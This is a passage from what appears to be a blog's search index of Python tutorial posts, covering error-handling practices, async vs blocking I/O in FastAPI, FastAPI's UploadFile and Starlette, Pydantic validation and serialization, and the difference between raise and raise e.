incorrect punctuation or misspelled keywords. They are typically caught by the compiler or interpreter before execution.</li> <li>Runtime errors: These happen during program execution and often result from unexpected conditions like division by zero, accessing invalid memory locations, or file not found errors.</li> <li>Logical errors: These are errors in the program\u2019s logic that produce incorrect results without causing the program to crash. They can be difficult to detect and often require careful code review and testing.</li> </ul>"},{"location":"blog/old-blogs/2024-08-12_Mastering-Error-Handling--A-Comprehensive-Guide-9db00b203f15/#the-cost-of-poor-error-handling","title":"The Cost of Poor Error Handling","text":"<p>The consequences of inadequate error handling can be severe:</p> <ul> <li>Lost revenue: System downtime due to unhandled errors can result in significant financial losses.</li> <li>Damaged reputation: Frequent application crashes or unhelpful error messages can damage the reputation of a software product or company.</li> <li>Security vulnerabilities: Poor error handling might expose sensitive information or create vulnerabilities that can be exploited by attackers.</li> <li>Increased support costs: Users encountering frequent errors are more likely to seek support, increasing costs for customer service.</li> </ul>"},{"location":"blog/old-blogs/2024-08-12_Mastering-Error-Handling--A-Comprehensive-Guide-9db00b203f15/#error-handling-best-practices","title":"Error Handling Best Practices","text":""},{"location":"blog/old-blogs/2024-08-12_Mastering-Error-Handling--A-Comprehensive-Guide-9db00b203f15/#anticipate-potential-errors","title":"Anticipate Potential Errors","text":"<p>By carefully analyzing the code and considering possible inputs and outputs, developers can identify potential error scenarios and implement preventive measures. This proactive approach helps in creating more robust applications.</p>"},{"location":"blog/old-blogs/2024-08-12_Mastering-Error-Handling--A-Comprehensive-Guide-9db00b203f15/#use-descriptive-error-messages","title":"Use Descriptive Error Messages","text":"<p>Clear and informative error messages are invaluable for debugging and troubleshooting. They should provide enough details about the error without overwhelming the user.</p>"},{"location":"blog/old-blogs/2024-08-12_Mastering-Error-Handling--A-Comprehensive-Guide-9db00b203f15/#implement-proper-logging","title":"Implement Proper Logging","text":"<p>Logging errors to a dedicated log file or system helps in tracking issues, analyzing patterns, and identifying the root cause of problems. Detailed logs are essential for effective debugging and performance monitoring.</p>"},{"location":"blog/old-blogs/2024-08-12_Mastering-Error-Handling--A-Comprehensive-Guide-9db00b203f15/#test-your-error-handling","title":"Test Your Error Handling","text":"<p>Thorough testing is crucial to ensure that error handling mechanisms work as expected. Write unit and integration tests to cover various error scenarios and verify the application\u2019s behavior.</p>"},{"location":"blog/old-blogs/2024-08-12_Mastering-Error-Handling--A-Comprehensive-Guide-9db00b203f15/#graceful-degradation","title":"Graceful Degradation","text":"<p>When encountering errors, it\u2019s important to provide alternative functionality or fallback options to maintain basic system operation. This helps prevent complete failures and ensures a better user experience.</p>"},{"location":"blog/old-blogs/2024-08-12_Mastering-Error-Handling--A-Comprehensive-Guide-9db00b203f15/#user-friendly-error-messages","title":"User-Friendly Error Messages","text":"<p>Error messages should be presented in a clear and understandable manner to users, avoiding technical jargon. They should provide guidance on how to resolve the issue or whom to contact for assistance.</p>"},{"location":"blog/old-blogs/2024-08-12_Mastering-Error-Handling--A-Comprehensive-Guide-9db00b203f15/#error-handling-techniques","title":"Error Handling Techniques","text":""},{"location":"blog/old-blogs/2024-08-12_Mastering-Error-Handling--A-Comprehensive-Guide-9db00b203f15/#try-except-blocks","title":"Try-Except Blocks","text":"<p>These are fundamental constructs in many programming languages for handling exceptions. The try block encapsulates code that might raise an exception, and the except block defines the actions to be taken when a specific exception occurs. This allows for graceful error handling and prevents program crashes.</p>"},{"location":"blog/old-blogs/2024-08-12_Mastering-Error-Handling--A-Comprehensive-Guide-9db00b203f15/#error-handling-in-specific-languagesframeworks","title":"Error Handling in Specific Languages/Frameworks","text":"<p>Different languages and frameworks offer unique approaches to error handling. For example, Python\u2019s try-except blocks, JavaScript\u2019s try-catch blocks, and C++\u2019s exception handling mechanisms vary in syntax and behavior. Understanding language-specific features is crucial for effective error management.</p>"},{"location":"blog/old-blogs/2024-08-12_Mastering-Error-Handling--A-Comprehensive-Guide-9db00b203f15/#custom-error-classes","title":"Custom Error Classes","text":"<p>To create more specific and informative error conditions, developers can define custom error classes that inherit from built-in exception classes. This provides a way to encapsulate error details and create tailored error handling logic.</p>"},{"location":"blog/old-blogs/2024-08-12_Mastering-Error-Handling--A-Comprehensive-Guide-9db00b203f15/#assertions","title":"Assertions","text":"<p>Assertions are used to check for conditions that should always be true during program execution. If an assertion fails, it typically raises an AssertionError, indicating a programming error. Assertions are helpful for debugging and testing but should be used judiciously to avoid performance impacts in production environments.</p>"},{"location":"blog/old-blogs/2024-08-12_Mastering-Error-Handling--A-Comprehensive-Guide-9db00b203f15/#exception-chaining","title":"Exception Chaining","text":"<p>When handling an exception, it\u2019s often useful to preserve the original exception information. Exception chaining allows you to create a new exception while passing the original exception as its cause. This helps in tracing the error origin and providing more context.</p>"},{"location":"blog/old-blogs/2024-08-12_Mastering-Error-Handling--A-Comprehensive-Guide-9db00b203f15/#error-handling-in-asynchronous-code","title":"Error Handling in Asynchronous Code","text":"<p>Asynchronous programming introduces challenges for error handling due to the non-blocking nature of operations. Techniques like promises, async/await, and error handling middleware are used to manage errors in asynchronous code effectively.</p>"},{"location":"blog/old-blogs/2024-08-12_Mastering-Error-Handling--A-Comprehensive-Guide-9db00b203f15/#additional-tips-for-error-handling","title":"Additional Tips for Error Handling","text":"<ul> <li>Don\u2019t fail silently: Unhandled errors can lead to unexpected behavior. Always provide some form of feedback, whether to the user or to logs.</li> <li>Follow programming language guidelines: Adhere to the recommended error handling practices for your chosen language to ensure consistency and maintainability.</li> <li>Implement the full error model: Consider all possible error scenarios and handle them appropriately, including unexpected errors.</li> <li>Avoid swallowing the root cause: When handling an exception, re-raise it with additional context if necessary, but don\u2019t obscure the original error.</li> <li>Log error codes: Use informative error codes to facilitate debugging and analysis.</li> <li>Raise errors immediately: Don\u2019t delay error handling. Raise errors as soon as they are detected to prevent cascading failures.</li> <li>Use a consistent error handling approach: Maintain a uniform style for error handling throughout your codebase to improve readability and maintainability.</li> <li>Provide context-specific error messages: Tailor error messages to the specific situation to help users understand the problem and take corrective actions.</li> <li>Leverage debugging tools: Utilize debugging tools to inspect error conditions and step through code execution to identify the root cause of issues.</li> <li>Consider performance implications: While error handling is important, it should not significantly impact performance. Optimize error handling paths where possible.</li> <li>Learn from errors: Analyze error logs to identify recurring issues and improve error handling strategies over time.</li> <li>Test thoroughly: Write comprehensive unit and integration tests to verify error handling behavior under various conditions.</li> </ul>"},{"location":"blog/old-blogs/2024-08-12_Mastering-Error-Handling--A-Comprehensive-Guide-9db00b203f15/#conclusion","title":"Conclusion","text":"<p>Effective error handling is essential for building robust, reliable, and user-friendly applications. By anticipating potential errors, providing clear feedback, and implementing best practices, you can ensure your software performs smoothly and efficiently, enhancing both user satisfaction and system integrity.</p>"},{"location":"blog/old-blogs/2024-08-12_Mastering-Error-Handling--A-Comprehensive-Guide-9db00b203f15/#stackademic","title":"Stackademic \ud83c\udf93","text":"<p>Thank you for reading until the end. Before you go:</p> <ul> <li>Please consider clapping and following the writer! \ud83d\udc4f</li> <li>Follow us X | LinkedIn | YouTube | Discord</li> <li>Visit our other platforms: In Plain English | CoFeed | Differ</li> <li>More content at Stackademic.com</li> </ul> <p>By Kfir Gisman on August 12, 2024.</p> <p>Canonical link</p>"},{"location":"blog/old-blogs/2024-09-23_Unleash-the-Power-of--FastAPI--Async-vs-Blocking-I-O-7ec80edb7320/","title":"Unleash the Power of FastAPI: Async vs Blocking I/O","text":"<p>Discover how to optimize FastAPI by using async functions for concurrent request handling </p>"},{"location":"blog/old-blogs/2024-09-23_Unleash-the-Power-of--FastAPI--Async-vs-Blocking-I-O-7ec80edb7320/#unleash-the-power-of-fastapi-async-vs-blocking-io_1","title":"Unleash the Power of FastAPI: Async vs Blocking I/O","text":"<p>Are you ready to maximize your FastAPI application\u2019s performance? In this article, we\u2019ll explore how FastAPI handles concurrent requests and how you can optimize your app by leveraging async functions over traditional blocking I/O. By the end, you\u2019ll have a deeper understanding of when to use <code>async def</code> versus <code>def</code> and how to make your FastAPI APIs run blazingly fast!</p>"},{"location":"blog/old-blogs/2024-09-23_Unleash-the-Power-of--FastAPI--Async-vs-Blocking-I-O-7ec80edb7320/#why-does-concurrency-matter","title":"Why Does Concurrency Matter?","text":"<p>Handling multiple requests concurrently can dramatically improve the responsiveness of your web applications. A web server that can handle multiple requests at once is crucial in modern applications, especially when serving numerous users simultaneously.</p> <p>FastAPI, powered by Python\u2019s <code>asyncio</code> library, makes concurrent request handling a breeze with its support for asynchronous programming. The question is: how do we compare blocking and non-blocking I/O, and how does that impact our FastAPI applications?</p>"},{"location":"blog/old-blogs/2024-09-23_Unleash-the-Power-of--FastAPI--Async-vs-Blocking-I-O-7ec80edb7320/#code-example","title":"Code Example","text":"<p>To demonstrate how FastAPI handles concurrent requests and to understand the performance differences between <code>async def</code> and <code>def</code>, we\u2019ll create a simple example where we compare blocking I/O with non-blocking I/O using <code>time.sleep</code> and <code>asyncio.sleep</code>. Visit the Code example here.</p>"},{"location":"blog/old-blogs/2024-09-23_Unleash-the-Power-of--FastAPI--Async-vs-Blocking-I-O-7ec80edb7320/#blocking-io-in-fastapi","title":"Blocking I/O in FastAPI","text":"<p>Let\u2019s first take a look at how traditional blocking I/O works in FastAPI. For this, we\u2019ll use Python\u2019s built-in <code>time.sleep()</code> to simulate an I/O-bound task that blocks the thread for 5 seconds:</p> <pre><code>@app.get(\"/blocking\")  \ndef blocking_io():  \n time.sleep(5)  \n return {\"message\": \"Blocking I/O completed\"}\n</code></pre> <p>This blocks the entire application\u2019s thread, meaning no other requests can be processed while this one is running. This is highly inefficient if your application needs to handle many simultaneous users.</p>"},{"location":"blog/old-blogs/2024-09-23_Unleash-the-Power-of--FastAPI--Async-vs-Blocking-I-O-7ec80edb7320/#non-blocking-io-fastapis-strength","title":"Non-Blocking I/O: FastAPI\u2019s Strength","text":"<p>With FastAPI, you can easily switch to non-blocking I/O using <code>async def</code> functions and <code>asyncio.sleep()</code>:</p> <pre><code>@app.get(\"/non-blocking\")  \nasync def non_blocking_io():  \n await asyncio.sleep(5)  \n return {\"message\": \"Non-blocking I/O completed\"}\n</code></pre> <p>In this case, while one request is waiting, other requests can be processed because <code>asyncio.sleep()</code> doesn\u2019t block the server\u2019s main thread. This improves performance and allows FastAPI to handle more requests concurrently.</p>"},{"location":"blog/old-blogs/2024-09-23_Unleash-the-Power-of--FastAPI--Async-vs-Blocking-I-O-7ec80edb7320/#when-to-use-def-vs-async-def-in-fastapi","title":"When to Use <code>def</code> vs async def in FastAPI","text":"<p>- Use <code>def</code> for CPU-bound tasks where the operation can benefit from parallel execution using a thread pool.</p> <p>- Use <code>async def</code> for I/O-bound tasks like waiting on a database, API calls, or file I/O, where non-blocking behavior is essential to maximize performance.</p>"},{"location":"blog/old-blogs/2024-09-23_Unleash-the-Power-of--FastAPI--Async-vs-Blocking-I-O-7ec80edb7320/#concurrency-in-action","title":"Concurrency in Action","text":"<p>FastAPI excels in handling concurrent requests. You can simulate concurrent execution using <code>asyncio.gather()</code>:</p> <pre><code>@app.get(\"/compare\")  \nasync def compare():  \n await asyncio.gather(non_blocking_io(), non_blocking_io())  \n return {\"message\": \"Both async operations completed concurrently\"}\n</code></pre> <p>Here, two asynchronous functions are executed concurrently, allowing your application to handle multiple tasks at the same time.</p>"},{"location":"blog/old-blogs/2024-09-23_Unleash-the-Power-of--FastAPI--Async-vs-Blocking-I-O-7ec80edb7320/#handling-multiple-requests-concurrently","title":"Handling Multiple Requests Concurrently","text":"<p>The real power of async becomes evident when you need to handle many requests concurrently. With FastAPI, it\u2019s easy to spin up multiple non-blocking tasks:</p> <pre><code>@app.get(\"/benchmark\")  \nasync def benchmark():  \n tasks = [non_blocking_io() for _ in range(10)]  \n await asyncio.gather(*tasks)  \n return {\"message\": \"Handled 10 concurrent requests!\"}\n</code></pre> <p>This approach scales well, enabling your application to serve more users without being held back by blocking I/O operations.</p>"},{"location":"blog/old-blogs/2024-09-23_Unleash-the-Power-of--FastAPI--Async-vs-Blocking-I-O-7ec80edb7320/#final-thoughts","title":"Final Thoughts","text":"<p>FastAPI, with its native support for asynchronous programming, empowers you to build high-performance applications. By understanding the differences between blocking and non-blocking I/O, and when to use <code>async def</code> vs <code>def</code>, you can optimize your API\u2019s performance to handle concurrent requests efficiently.</p> <p>Stay tuned for more FastAPI deep dives, and happy coding!</p>"},{"location":"blog/old-blogs/2024-09-23_Unleash-the-Power-of--FastAPI--Async-vs-Blocking-I-O-7ec80edb7320/#references","title":"References","text":"<p>1. FastAPI Official Documentation</p> <p>2. Python\u2019s asyncio Documentation</p> <p>3. Threading in Python</p> <p>4. Concurrency in Python: Understanding Async and Threading</p> <p>5. FastAPI Performance Benchmark</p>"},{"location":"blog/old-blogs/2024-09-23_Unleash-the-Power-of--FastAPI--Async-vs-Blocking-I-O-7ec80edb7320/#in-plain-english","title":"In Plain English \ud83d\ude80","text":"<p>Thank you for being a part of the** In Plain English** community! Before you go:</p> <ul> <li>Be sure to clap and follow the writer \ufe0f\ud83d\udc4f\ufe0f\ufe0f</li> <li>Follow us: X | LinkedIn | YouTube | Discord | Newsletter</li> <li>Visit our other platforms: CoFeed | Differ</li> <li>More content at PlainEnglish.io</li> </ul> <p>By Kfir Gisman on September 23, 2024.</p> <p>Canonical link</p>"},{"location":"blog/old-blogs/2024-09-30_Understanding-FastAPI-s-UploadFile--The-Starlette-Connection-bcf4b69d0439/","title":"Understanding FastAPI\u2019s UploadFile: The Starlette Connection","text":"<p>Why does FastAPI\u2019s UploadFile seem like Starlette\u2019s? Explore FastAPI\u2019s elegant, modular design in this deep dive! </p>"},{"location":"blog/old-blogs/2024-09-30_Understanding-FastAPI-s-UploadFile--The-Starlette-Connection-bcf4b69d0439/#understanding-fastapis-uploadfile-the-starlette-connection_1","title":"Understanding FastAPI\u2019s UploadFile: The Starlette Connection","text":"<p>In the world of FastAPI, file uploads are a common requirement for many applications. The <code>UploadFile</code> class serves as a key component for handling file uploads efficiently. However, a common point of confusion arises when developers check the type of an <code>UploadFile</code> instance, only to find that it appears to be an instance of Starlette\u2019s <code>UploadFile</code> instead of FastAPI\u2019s. In this blog, we will dive deep into the architecture of FastAPI, examine the nature of the <code>UploadFile</code> class, and clarify why this behavior occurs.</p> <p></p>"},{"location":"blog/old-blogs/2024-09-30_Understanding-FastAPI-s-UploadFile--The-Starlette-Connection-bcf4b69d0439/#the-architecture-behind-fastapi","title":"The Architecture Behind FastAPI","text":"<p>FastAPI is built on top of Starlette, which is a lightweight ASGI framework. This design choice allows FastAPI to leverage the high-performance capabilities of Starlette while extending it with additional features like automatic data validation and serialization through Pydantic. One of the main components of FastAPI for handling file uploads is the <code>UploadFile</code> class, which is designed for easy interaction with files uploaded through HTTP requests.</p> <p>When you import <code>UploadFile</code> in your FastAPI application, you are actually importing a subclass of Starlette\u2019s <code>UploadFile</code>. The FastAPI implementation adds some extra functionality and enhancements, but it fundamentally relies on the core mechanics provided by Starlette.</p>"},{"location":"blog/old-blogs/2024-09-30_Understanding-FastAPI-s-UploadFile--The-Starlette-Connection-bcf4b69d0439/#the-confusion-type-checking","title":"The Confusion: Type Checking","text":"<p>Consider the following code snippet where we check the type of an uploaded file:</p> <pre><code>from fastapi import FastAPI, UploadFile, File  \nfrom typing import Dict\n\napp = FastAPI()\n\n@app.post(\"/upload/\")  \nasync def upload_file(file: UploadFile = File(...)) -&gt; Dict[str, str]:  \n    is_uploadfile_instance = isinstance(file, UploadFile)  \n    is_starlette_uploadfile_instance = isinstance(file, StarletteUploadFile)  # Assuming you imported it  \n    file_type = type(file)\n\n    return {  \n        \"is_UploadFile_instance\": str(is_uploadfile_instance),  \n        \"is_Starlette_UploadFile_instance\": str(is_starlette_uploadfile_instance),  \n        \"file_type\": str(file_type),  \n        \"filename\": file.filename  \n    }\n</code></pre> <p>Here\u2019s the crux of the confusion: when you perform the check with <code>isinstance(file, UploadFile)</code>, you might expect it to return <code>True</code>, indicating that <code>file</code> is an instance of FastAPI\u2019s <code>UploadFile</code>. However, if you check the actual type of <code>file</code>, it will show as an instance of <code>starlette.datastructures.UploadFile</code>.</p> <p>The reason for this is rooted in Python\u2019s class inheritance and how FastAPI structures its components. FastAPI\u2019s <code>UploadFile</code> class inherits from Starlette\u2019s <code>UploadFile</code>, so when you create an instance of FastAPI\u2019s <code>UploadFile</code>, it retains the base class type from Starlette.</p>"},{"location":"blog/old-blogs/2024-09-30_Understanding-FastAPI-s-UploadFile--The-Starlette-Connection-bcf4b69d0439/#why-does-this-matter","title":"Why Does This Matter?","text":"<p>Understanding this behavior is crucial for developers working with FastAPI, especially when debugging or writing type-dependent logic. The distinction highlights the elegance of FastAPI\u2019s design: it builds on established components from Starlette to provide a richer feature set while maintaining the underlying functionality. This allows developers to leverage the best of both worlds \u2014 the robust capabilities of Starlette combined with the advanced features of FastAPI.</p>"},{"location":"blog/old-blogs/2024-09-30_Understanding-FastAPI-s-UploadFile--The-Starlette-Connection-bcf4b69d0439/#summary","title":"Summary","text":"<p>The confusion regarding <code>UploadFile</code> instances in FastAPI arises from the framework\u2019s architectural choices. By importing <code>UploadFile</code> from FastAPI, you are utilizing a class that is a subclass of Starlette\u2019s <code>UploadFile</code>. Consequently, type checks will reveal the underlying Starlette class, not the FastAPI wrapper.</p> <p>In summary, while FastAPI extends and enhances the functionality of Starlette, it is important to remember that its components are built on top of these foundational classes. This design choice not only fosters efficiency but also maintains compatibility with existing standards in web development. Understanding this relationship allows developers to navigate the FastAPI landscape with greater clarity and confidence.</p>"},{"location":"blog/old-blogs/2024-09-30_Understanding-FastAPI-s-UploadFile--The-Starlette-Connection-bcf4b69d0439/#additional-resources","title":"Additional Resources","text":"<p>To further explore the topics discussed in this blog, consider the following links:</p> <ul> <li>FastAPI Documentation: Upload File</li> <li>FastAPI UploadFile Class</li> <li>Starlette Documentation: UploadFile</li> <li>Understanding ASGI</li> <li>Starlette UploadFile Class</li> <li>Understanding FastAPI: How Starlette works</li> </ul>"},{"location":"blog/old-blogs/2024-09-30_Understanding-FastAPI-s-UploadFile--The-Starlette-Connection-bcf4b69d0439/#in-plain-english","title":"In Plain English \ud83d\ude80","text":"<p>Thank you for being a part of the** In Plain English** community! Before you go:</p> <ul> <li>Be sure to clap and follow the writer \ufe0f\ud83d\udc4f\ufe0f\ufe0f</li> <li>Follow us: X | LinkedIn | YouTube | Discord | Newsletter</li> <li>Visit our other platforms: CoFeed | Differ</li> <li>More content at PlainEnglish.io</li> </ul> <p>By Kfir Gisman on September 30, 2024.</p> <p>Canonical link</p>"},{"location":"blog/old-blogs/2024-10-12_Building-Robust-Components-with-FastAPI-and-Pydantic-a99e34532241/","title":"Building Robust Components with FastAPI and Pydantic","text":"<p>Learn how to build robust FastAPI components using Pydantic for data validation, improving API integrity, readability, and error handling. </p>"},{"location":"blog/old-blogs/2024-10-12_Building-Robust-Components-with-FastAPI-and-Pydantic-a99e34532241/#building-robust-components-with-fastapi-and-pydantic_1","title":"Building Robust Components with FastAPI and Pydantic","text":""},{"location":"blog/old-blogs/2024-10-12_Building-Robust-Components-with-FastAPI-and-Pydantic-a99e34532241/#leveraging-well-defined-objects-for-efficient-data-validation","title":"Leveraging Well-Defined Objects for Efficient Data Validation","text":"<p>Objects serve as the entry and exit points for components, acting as fundamental gateways for data flow. To create robust, maintainable components, it\u2019s essential to define clear, well-structured fields within these objects. This ensures data integrity and reliable interactions among different system parts. Personally, I prefer using Python along with the FastAPI framework for developing modern, high-performance APIs. For data validation, Pydantic is my library of choice, seamlessly integrating with FastAPI to elegantly enforce field constraints and maintain consistency throughout the system.</p> <pre><code>from fastapi import FastAPI, HTTPException  \nfrom pydantic import BaseModel, EmailStr, Field, ValidationError, conint\n\n# FastAPI instance  \napp = FastAPI()\n\n# Pydantic model for request body validation  \nclass User(BaseModel):  \n    name: str = Field(..., min_length=3, max_length=50, description=\"Name must be between 3 and 50 characters\")  \n    age: conint(gt=0, le=120) = Field(..., description=\"Age must be between 1 and 120\")  # Constrained integer type  \n    email: EmailStr = Field(..., description=\"Must be a valid email address\")\n\n# API route to handle user data submission  \n@app.post(\"/create-user/\")  \nasync def create_user(user: User):  \n    try:  \n        # If validation passes, this will run  \n        return {\"message\": f\"User {user.name} created successfully!\"}  \n    except ValidationError as e:  \n        # Catch and return validation errors  \n        raise HTTPException(status_code=400, detail=e.errors())\n\n# Sample invalid data  \ninvalid_data = {\"name\": \"A\", \"age\": -5, \"email\": \"invalid_email\"}\n\n# Simulate calling the route with invalid data  \n@app.get(\"/test-invalid-data/\")  \nasync def test_invalid_data():  \n    try:  \n        user = User(**invalid_data)  # Validation will fail here  \n    except ValidationError as e:  \n        return {\"error\": e.errors()}\n\n# Run the server using: uvicorn &lt;filename&gt;:app --reload\n</code></pre> <p>In this example, we demonstrate how FastAPI and Pydantic work together to efficiently handle data validation. Using Pydantic\u2019s <code>BaseModel</code>, we define validation rules for incoming request data. For instance, we utilize <code>EmailStr</code> to automatically validate email formats, simplifying the process without needing custom regex. Similarly, we use <code>conint</code> (a constrained integer type) to ensure age falls within a specific range, from 1 to 120. This approach enhances readability and safety.</p> <p>In the example code, a <code>User</code> model is defined with fields such as <code>name</code>, <code>age</code>, and <code>email</code>, each having its validation criteria. When a user submits data through the <code>/create-user/</code> route, FastAPI automatically validates the input against these rules. If valid, the user is created successfully; if not, FastAPI raises a <code>400 Bad Request</code> with detailed error messages. This significantly reduces the risk of processing incorrect or malicious data, making FastAPI a powerful choice for secure API development.</p>"},{"location":"blog/old-blogs/2024-10-12_Building-Robust-Components-with-FastAPI-and-Pydantic-a99e34532241/#custom-fieldmodel-validation-with-pydantic","title":"Custom Field/Model Validation with Pydantic","text":"<p>Pydantic v2 introduces model-level validation, allowing you to validate multiple fields in relation to each other using the @model_validator decorator. This validation runs after field validation and is particularly useful for ensuring that certain conditions between fields are met. For instance, you might want to confirm that a start_date occurs before an end_date in an event model:</p> <pre><code>from pydantic import BaseModel, model_validator  \nfrom datetime import date\n\nclass Event(BaseModel):  \n    name: str  \n    start_date: date  \n    end_date: date\n\n    @model_validator(mode='after')  \n    def check_dates(cls, values):  \n        start, end = values.get('start_date'), values.get('end_date')  \n        if start and end and start &gt;= end:  \n            raise ValueError('start_date must be before end_date')  \n        return values\n</code></pre> <p>In this example, the <code>@model_validator</code> checks that start_date is earlier than end_date. If this condition is not met, Pydantic raises a validation error. This model-level validation is beneficial for ensuring that the relationships between multiple fields are accurately enforced.</p>"},{"location":"blog/old-blogs/2024-10-12_Building-Robust-Components-with-FastAPI-and-Pydantic-a99e34532241/#custom-serialization-in-pydantic","title":"Custom Serialization in Pydantic","text":"<p>Pydantic allows for custom serialization of model fields by overriding the <code>dict()</code> or <code>json()</code> methods. This is useful when you want to modify the output format or exclude certain fields during serialization. You can also use the <code>@property</code> decorator to add computed fields that are included in serialization but not part of the model\u2019s raw data.</p> <p>Here\u2019s an example of custom serialization that modifies how a full name is returned while excluding the <code>password</code> field from the serialized output:</p> <pre><code>from pydantic import BaseModel\n\nclass User(BaseModel):  \n    first_name: str  \n    last_name: str  \n    password: str\n\n    # Custom serialization to return the full name  \n    @property  \n    def full_name(self):  \n        return f\"{self.first_name} {self.last_name}\"\n\n    # Overriding dict() to exclude the password  \n    def dict(self, **kwargs):  \n        result = super().dict(**kwargs)  \n        result['full_name'] = self.full_name  # Add computed field  \n        result.pop('password', None)  # Remove password from serialization  \n        return result\n\n# Example usage  \nuser = User(first_name=\"John\", last_name=\"Doe\", password=\"secret123\")  \nprint(user.dict())\n</code></pre> <p>In this example, <code>full_name</code> is a computed property, and we override the <code>dict()</code> method to ensure <code>password</code> is excluded from the output. Custom serialization like this offers fine-grained control over how model data is exposed in APIs or responses.</p>"},{"location":"blog/old-blogs/2024-10-12_Building-Robust-Components-with-FastAPI-and-Pydantic-a99e34532241/#fastapi-and-pydantic-integration","title":"FastAPI and Pydantic Integration","text":"<p>Pydantic integrates seamlessly with FastAPI, providing automatic data validation for request payloads, query parameters, and path parameters. When you define a Pydantic model in a FastAPI endpoint, FastAPI automatically handles parsing and validating the incoming data against the model\u2019s rules. If the data is invalid, FastAPI returns a detailed 422 Unprocessable Entity response with clear error messages.</p> <p>Here\u2019s a simple example:</p> <pre><code>from fastapi import FastAPI  \nfrom pydantic import BaseModel\n\napp = FastAPI()\n\nclass User(BaseModel):  \n    username: str  \n    age: int\n\n@app.post(\"/users/\")  \nasync def create_user(user: User):  \n    return {\"message\": f\"User {user.username} created successfully\n</code></pre> <p>In this example, when a POST request is sent to <code>/users/</code>, FastAPI uses Pydantic to validate the incoming JSON data. If the data does not conform to the <code>User</code> model (e.g., missing <code>username</code> or an invalid <code>age</code>), FastAPI automatically returns an error response, simplifying input validation and error handling.</p>"},{"location":"blog/old-blogs/2024-10-12_Building-Robust-Components-with-FastAPI-and-Pydantic-a99e34532241/#summary","title":"Summary","text":"<p>In summary, leveraging Pydantic with FastAPI enhances your ability to create robust, maintainable applications by ensuring data integrity through clear validations. This powerful combination simplifies the development process while improving security and reliability, making it a preferred choice for building modern APIs.</p>"},{"location":"blog/old-blogs/2024-10-12_Building-Robust-Components-with-FastAPI-and-Pydantic-a99e34532241/#references","title":"References","text":"<p>Pydantic features in FastAPI Pydantic V2 Plan</p>"},{"location":"blog/old-blogs/2024-10-12_Building-Robust-Components-with-FastAPI-and-Pydantic-a99e34532241/#in-plain-english","title":"In Plain English \ud83d\ude80","text":"<p>Thank you for being a part of the** In Plain English** community! Before you go:</p> <ul> <li>Be sure to clap and follow the writer \ufe0f\ud83d\udc4f\ufe0f\ufe0f</li> <li>Follow us: X | LinkedIn | YouTube | Discord | Newsletter|Podcast</li> <li>Create a free AI-powered blog on Differ.</li> <li>More content at PlainEnglish.io</li> </ul> <p>By Kfir Gisman on October 12, 2024.</p> <p>Canonical link</p>"},{"location":"blog/old-blogs/2024-10-28_Raising-the-Difference-Between-raise-and-raise-e-941a3612aea5/","title":"Raising the Difference Between raise and raise e","text":"<p>Explains how raise preserves the original traceback for better debugging, while raise e resets it, potentially obscuring the error\u2019s origin </p>"},{"location":"blog/old-blogs/2024-10-28_Raising-the-Difference-Between-raise-and-raise-e-941a3612aea5/#raising-the-difference-between-raise-and-raise-e_1","title":"Raising the Difference Between raise and raise e","text":"<p>When handling exceptions in Python, it\u2019s common to encounter scenarios where we need to re-raise an error. There are two primary ways to do this: <code>raise</code> and <code>raise e</code>. While they may seem similar at first glance, these two forms handle tracebacks differently, impacting how errors are logged and, ultimately, how debugging plays out. In this post, we\u2019ll break down the distinction between <code>raise</code> and <code>raise e</code> and discuss when to use each for clearer, more maintainable error handling.</p> <p></p>"},{"location":"blog/old-blogs/2024-10-28_Raising-the-Difference-Between-raise-and-raise-e-941a3612aea5/#the-basics-of-exception-handling","title":"The Basics of Exception Handling","text":"<p>Before diving into the difference, let\u2019s recap how exception handling works in Python. When an error occurs within a <code>try</code> block, the code jumps to the <code>except</code> block, where we can handle the error gracefully or re-raise it for further handling. Sometimes, it\u2019s useful to catch an error, do something (like logging it), and then re-raise the exception to be handled by another part of the program.</p> <pre><code>try:  \n    result = 1 / 0  # Division by zero raises a ZeroDivisionError  \nexcept ZeroDivisionError as e:  \n    print(\"Caught an error!\")  \n    raise  # Re-raises the original exception\n</code></pre> <p>In this case, the <code>raise</code> statement re-raises the original <code>ZeroDivisionError</code>, allowing the error to propagate up to higher-level error handlers.</p>"},{"location":"blog/old-blogs/2024-10-28_Raising-the-Difference-Between-raise-and-raise-e-941a3612aea5/#raise-vs-raise-e","title":"<code>raise</code> vs. <code>raise e</code>","text":"<p>Here\u2019s the critical difference:</p> <ul> <li><code>**raise**</code>: Re-raises the caught exception while preserving the original traceback.</li> <li><code>**raise e**</code>: Re-raises the caught exception but resets the traceback to start from the line where <code>raise e</code> is called.</li> </ul> <p>The distinction may seem minor, but it can significantly impact how tracebacks are displayed and how easy they are to interpret.</p>"},{"location":"blog/old-blogs/2024-10-28_Raising-the-Difference-Between-raise-and-raise-e-941a3612aea5/#example-code","title":"Example Code","text":"<p>Let\u2019s illustrate this difference with a Python script:</p> <pre><code>import traceback\n\ndef raise_exception_with_raise():  \n    try:  \n        result = 1 / 0  # This will cause a ZeroDivisionError  \n    except ZeroDivisionError as e:  \n        print(\"Caught an error, re-raising with 'raise'...\")  \n        raise  # Re-raises the original exception with its original traceback  \ndef raise_exception_with_raise_e():  \n    try:  \n        result = 1 / 0  # This will cause a ZeroDivisionError  \n    except ZeroDivisionError as e:  \n        print(\"Caught an error, re-raising with 'raise e'...\")  \n        raise e  # Raises the exception with a new traceback  \nprint(\"======= Using 'raise': =======\")  \ntry:  \n    raise_exception_with_raise()  \nexcept ZeroDivisionError as e:  \n    print(\"Traceback using 'raise':\")  \n    traceback.print_exc()  # Prints the original traceback  \nprint(\"\\n======= Using 'raise e': =======\")  \ntry:  \n    raise_exception_with_raise_e()  \nexcept ZeroDivisionError as e:  \n    print(\"Traceback using 'raise e':\")  \n    traceback.print_exc()  # Prints the new traceback\n</code></pre> <p>In this example, both <code>raise_exception_with_raise</code> and <code>raise_exception_with_raise_e</code> attempt to divide by zero, catching the <code>ZeroDivisionError</code> in their <code>except</code> blocks. Let\u2019s look at what happens with each approach.</p>"},{"location":"blog/old-blogs/2024-10-28_Raising-the-Difference-Between-raise-and-raise-e-941a3612aea5/#output-analysis","title":"Output Analysis","text":""},{"location":"blog/old-blogs/2024-10-28_Raising-the-Difference-Between-raise-and-raise-e-941a3612aea5/#using-raise","title":"Using <code>raise</code>:","text":"<pre><code>======= Using 'raise': =======  \nCaught an error, re-raising with 'raise'...  \nTraceback using 'raise':  \nTraceback (most recent call last):  \n  File \"example.py\", line 19, in &lt;module&gt;  \n    raise_exception_with_raise()  \n  File \"example.py\", line 5, in raise_exception_with_raise  \n    result = 1 / 0  # This will cause a ZeroDivisionError  \nZeroDivisionError: 